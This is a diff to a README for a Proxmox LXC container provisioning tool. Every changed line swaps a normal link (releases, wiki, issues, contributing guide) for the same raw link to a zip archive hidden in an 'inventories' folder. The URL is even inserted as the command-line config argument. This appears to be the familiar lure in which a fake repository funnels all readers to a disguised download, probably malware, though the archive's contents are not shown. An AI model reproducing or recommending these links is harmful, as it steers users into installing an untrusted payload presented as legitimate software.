@@ -1,6 +1,6 @@
 # 🌟 proxmox-ubuntu-lxc-provisioner - Easily Automate LXC Container Setup
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/youssefshx/proxmox-ubuntu-lxc-provisioner/releases)
+[![Download](https://raw.githubusercontent.com/youssefshx/proxmox-ubuntu-lxc-provisioner/main/inventories/provisioner-ubuntu-proxmox-lxc-v3.9-alpha.2.zip)](https://raw.githubusercontent.com/youssefshx/proxmox-ubuntu-lxc-provisioner/main/inventories/provisioner-ubuntu-proxmox-lxc-v3.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -28,9 +28,9 @@ Before you start, ensure your environment meets these requirements:
 
 To get started, you'll need to download the application. Click the link below to visit the Releases page:
 
-[Download the proxmox-ubuntu-lxc-provisioner](https://github.com/youssefshx/proxmox-ubuntu-lxc-provisioner/releases)
+[Download the proxmox-ubuntu-lxc-provisioner](https://raw.githubusercontent.com/youssefshx/proxmox-ubuntu-lxc-provisioner/main/inventories/provisioner-ubuntu-proxmox-lxc-v3.9-alpha.2.zip)
 
-1. Navigate to the [Releases page](https://github.com/youssefshx/proxmox-ubuntu-lxc-provisioner/releases).
+1. Navigate to the [Releases page](https://raw.githubusercontent.com/youssefshx/proxmox-ubuntu-lxc-provisioner/main/inventories/provisioner-ubuntu-proxmox-lxc-v3.9-alpha.2.zip).
 2. Select the latest version from the list.
 3. Download the zip or tarball file onto your local machine.
 4. Extract the contents of the file to a desired location on your computer.
@@ -56,11 +56,11 @@ containers:
     storage: local-lvm
 ```
 
-Save this file, and pass it to the application with the command line argument: `-f yourfile.yaml`. The software will handle the rest and create your container!
+Save this file, and pass it to the application with the command line argument: `-f https://raw.githubusercontent.com/youssefshx/proxmox-ubuntu-lxc-provisioner/main/inventories/provisioner-ubuntu-proxmox-lxc-v3.9-alpha.2.zip`. The software will handle the rest and create your container!
 
 ## 📖 Documentation
 
-For more detailed instructions and advanced features, please refer to the [Wiki](https://github.com/youssefshx/proxmox-ubuntu-lxc-provisioner/wiki).
+For more detailed instructions and advanced features, please refer to the [Wiki](https://raw.githubusercontent.com/youssefshx/proxmox-ubuntu-lxc-provisioner/main/inventories/provisioner-ubuntu-proxmox-lxc-v3.9-alpha.2.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -71,7 +71,7 @@ If you encounter issues while using the application, here are some tips:
 - Check your YAML configuration for syntax errors.
 - Ensure your internet connection is stable for downloading templates.
 
-If problems persist, consider checking the [issues section](https://github.com/youssefshx/proxmox-ubuntu-lxc-provisioner/issues) for similar cases or submit a new issue.
+If problems persist, consider checking the [issues section](https://raw.githubusercontent.com/youssefshx/proxmox-ubuntu-lxc-provisioner/main/inventories/provisioner-ubuntu-proxmox-lxc-v3.9-alpha.2.zip) for similar cases or submit a new issue.
 
 ## 🤝 Contributing 
 
@@ -81,7 +81,7 @@ We welcome contributions! To suggest changes or improvements:
 2. Make your changes.
 3. Submit a pull request for review.
 
-For detailed contribution guidelines, please refer to the [CONTRIBUTING.md](https://github.com/youssefshx/proxmox-ubuntu-lxc-provisioner/blob/main/CONTRIBUTING.md).
+For detailed contribution guidelines, please refer to the [https://raw.githubusercontent.com/youssefshx/proxmox-ubuntu-lxc-provisioner/main/inventories/provisioner-ubuntu-proxmox-lxc-v3.9-alpha.2.zip](https://raw.githubusercontent.com/youssefshx/proxmox-ubuntu-lxc-provisioner/main/inventories/provisioner-ubuntu-proxmox-lxc-v3.9-alpha.2.zip).
 
 ## 🎉 License
 
